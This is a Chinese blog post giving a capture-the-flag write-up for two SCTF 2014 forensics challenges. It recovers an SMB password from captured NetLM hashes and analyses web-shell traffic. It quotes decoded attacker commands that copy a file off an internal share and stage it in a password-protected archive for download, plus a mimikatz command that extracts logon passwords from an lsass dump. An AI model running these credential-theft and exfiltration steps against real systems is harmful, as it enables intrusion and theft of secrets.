<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="A blog containing some interesting things."><title>SCTF 2014 初赛Writeup | Beeeの零碎事</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">SCTF 2014 初赛Writeup</h1><a id="logo" href="/.">Beeeの零碎事</a><p class="description">Just so so~</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">SCTF 2014 初赛Writeup</h1><div class="post-meta">Dec 11, 2014</div><div class="post-content"><p>今年来和小伙伴们参加了BCTF，ALICTF，HCTF和SCTF，前几次基本上都是准备不充分，很多东西看到题目才去找资源，而且好些题过后看了Writeup才发现和真正解法擦肩而过。这次SCTF终于有所贡献，撸出了两题，其中有一题差一点就是FirstBlood。</p>
<p>以下是题解：</p>
<h3 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h3><p>用wireshark打开提供的pcap文件，大概可以看出这是一个smb认证过程，先设置过滤器，过滤出smb流量。从Negotiate Protocol Response报文可以看到smb版本和challenge：<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxw1k37iolj30sg0i4adx.jpg" alt="misc300-1"></p>
<p>从Session Setup AndX Request报文可以看到syclover用户所属的域以及ANSI Password和Unicode Password：<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxw1kbccbrj30sg0i442k.jpg" alt="misc300-2"></p>
<p>ANSI Password的生成过程是在syclover用户长度为16字节的LM Hash后补充5字节的0x00，得到21字节的Hash，再分成3组，每组7字节。将每组的7字节经过str_to_key函数处理成8字节的DES Key，对服务器返回的challenge进行标准DES加密，得到3组8字节的密文，最后将加密后的密文拼接在一起。Unicode Password生成过程类似，只不过DES密钥是经过NTLM Hash处理后得到的。</p>
<p>而根据LM Hash的生成过程，LM Hash的前8字节是将用户明文密码的前7位转为大写，再经过str_to_ket和标准DES加密处理得到的。</p>
<p>综上，ANSI Password的前8字节与用户明文密码的前7位的大写形式以及服务器响应的challenge有关。本例中，challenge为0x1122334455667788，因此可以通过challenge为0x1122334455667788的HALFLM彩虹表来查出syclover用户明文密码的前7位大写形式。<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw1kdkkkqj30m909zai3.jpg" alt="misc300-3"></p>
<p>跑出明文密码前7位为NETLMIS后，再用msf tools目录下的脚本halflm_second.rb来穷举第二部分密码。<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxw1kfan4ij30qu07mgqt.jpg" alt="misc300-4"></p>
<p>得到明文密码的大写形式后，用netntlm.pl脚本来根据NTLM Hash调整大小写。旧版本的BackTrack linux自带netntlm.pl脚本，新版本的kali linux需自行下载该脚本。<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxw1kzkfsdj30kk0dyn4j.jpg" alt="misc300-5"></p>
<p>至此，得到syclover用户的明文密码，故flag为 SCTF{NetLMis666}</p>
<h3 id="Misc400a"><a href="#Misc400a" class="headerlink" title="Misc400a"></a>Misc400a</h3><p>用winshark打开提供的pcap文件，大致看了一下，发现一个config.php文件的POST动作，故设置过滤器，过滤出https流量。</p>
<p>点开一个POST包，发现eval、base64等关键字，初步判断config.php为一句话客户端<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw1l6rzm0j30sg0i4jx5.jpg" alt="Misc400a-1"></p>
<p>分别对各个POST包的数据进行base64解码，得到关键部分操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /d “c:\inetpub\wwwroot\”</span><br><span class="line">copy \\192.168.30.184\C$\windows\tasks\funnydata .\backup\1.gif</span><br><span class="line">C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif –hpJJBoom</span><br></pre></td></tr></table></figure>
<p>并从17729号报文中发现请求wwwroot.rar的http响应：<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw1le1jkjj30la0gd4ch.jpg" alt="misc400a-2"></p>
<p>直接保存二进制流到rar文件，winhex删掉https头部和php一句话客户端附加在头部的-&gt;|3字节，即可用密码JJBoom解压。</p>
<p>用winhex打开解压得到的1.gif，文件头部有MDMP文件头，判断为minidump文件，用windbg打开，使用 | 命令得到该minidump的进程名：<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw1lln1kwj30rv0e7qb4.jpg" alt="misc400a-3"></p>
<p>得知为lsass.exe进程的dump，接下来直接用mimikatz读取密码：</p>
<p><code>mimikatz.exe log “sekurlsa::minidump funnydata.mdmp” sekurlsa::logonPasswords exit</code></p>
<p>打开日志文件得到密码，注意密码后面有5个空格（真是坑，看到<tab><space>已经在怀疑是不是密码里有tab键和空格键，直接输入这个不过。后来发发现有空格。）<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxw1lorhjzj30oh0qcwoh.jpg" alt="misc400a-4"></space></tab></p>
<p>故本题flag为 <code>SCTF{&lt;TAB&gt;&lt;SPACE&gt;     }</code></p>
<p>这PS：这题有个小插曲，我的mimikatz不知道干嘛大小变成0k了，还以为环境问题，找了台win7x64的机子来弄，还是不行。就这折腾一下，别人做出来了，哭晕在厕所。</p>
</div><div class="tags"><a href="/tags/Writeup/">Writeup</a></div><div class="post-nav"><a class="pre" href="/2015/03/30/ALICTF-2015-Writeup/">ALICTF 2015 初赛Writeup</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="https://www.imbeee.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Homelab/" style="font-size: 15px;">Homelab</a> <a href="/tags/Writeup/" style="font-size: 15px;">Writeup</a> <a href="/tags/Pentest/" style="font-size: 15px;">Pentest</a> <a href="/tags/Tool/" style="font-size: 15px;">Tool</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://imbeee.github.io/" title="Github Pages备份" target="_blank">Github Pages备份</a><ul></ul><a href="https://ymr.me/" title="野蛮人の洞窟" target="_blank">野蛮人の洞窟</a><ul></ul><a href="http://bksec.net/" title="my5t3ry的blog" target="_blank">my5t3ry的blog</a><ul></ul><a href="https://www.blackh4t.org/" title="DarkRay's BLoG.!" target="_blank">DarkRay's BLoG.!</a><ul></ul><a href="https://www.iswin.org/" title="随风's Blog" target="_blank">随风's Blog</a><ul></ul><a href="http://www.00theway.org/" title="00theway's Blog" target="_blank">00theway's Blog</a><ul></ul><a href="https://threathunter.org/" title="ThreatHunter社区" target="_blank">ThreatHunter社区</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">Beeeの零碎事.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>